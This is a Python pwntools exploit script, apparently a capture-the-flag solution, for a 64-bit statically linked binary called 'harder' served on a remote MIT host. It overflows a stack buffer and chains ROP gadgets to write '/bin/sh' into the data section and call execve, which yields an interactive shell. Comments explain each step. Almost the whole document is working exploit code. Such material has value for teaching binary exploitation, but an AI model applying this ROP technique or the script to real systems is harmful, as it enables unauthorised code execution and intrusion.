from pwn import *

def main():
  trfghy  = 0x4009ae # trfghy
  poprdi  = 0x401526  # pop rdi ; ret
  poprsx  = 0x442ae9  # pop rdx ; pop rsi ; ret
  poprax  = 0x4787f6  # pop rax ; pop rdx ; pop rbx ; ret
  syscall = 0x467495  # syscall
  mvrdx   = 0x4356c3  # mov qword ptr [rdi], rdx ; ret
  data    = 0x6ca080 # data section

  # The binary is 64-bit and statically linked with NX and ASLR.
  # We have an obvious buffer overflow in the `trfghy` function.

  # We only have 24 bytes to play with at first, but we can get
  # more by calling trfghy again, with a larger argument.
  # Arguments are passed using a pop rdi gadget.

  # The difference between this binary and `again` is that we
  # don't have a reference to /bin/sh anywhere in the binary.
  # So, we'll have to create one ourselves.

  # What we'll do is use a `mov qword ptr` gadget to store
  # /bin/sh somewhere in the program's data section. Then
  # we'll reference it as usual.

  # Once we re-call `trfghy`, we can build a ROP chain to make
  # an execve syscall.
  # 59 --> rax (syscall number)
  # /bin/sh --> rdi (argument #1)
  # NULL --> rsi (argument #2)
  # NULL --> rdx (argument #3)

  # because the `read` function will read in newlines as well
  # it's easiest to combine the all the rop chains into one

  local = 0
  if local:
    p = process('./harder')
  else:
    p = remote("lox.xvm.mit.edu", 24002)

  # rop1 makes the trfghy(1000) call
  rop1 = "A" * 120 + p64(poprdi) + p64(1000) + p64(trfghy)

  # rop2 stores /bin/sh in the data section, and then
  # calls system("/bin/sh", NULL, NULL)
  rop2 = "A" * 120 + p64(poprdi) + p64(data)                 \
                   + p64(poprax) + p64(59) + p64(0) + p64(0) \
                   + p64(poprsx) + "/bin/sh\x00" + p64(0)    \
                   + p64(mvrdx)                              \
                   + p64(poprdi) + p64(data)                 \
                   + p64(poprsx) + p64(0) * 2                \
                   + p64(syscall)

  p.sendline(rop1 + rop2)
  p.interactive()

if __name__ == '__main__':
  main()
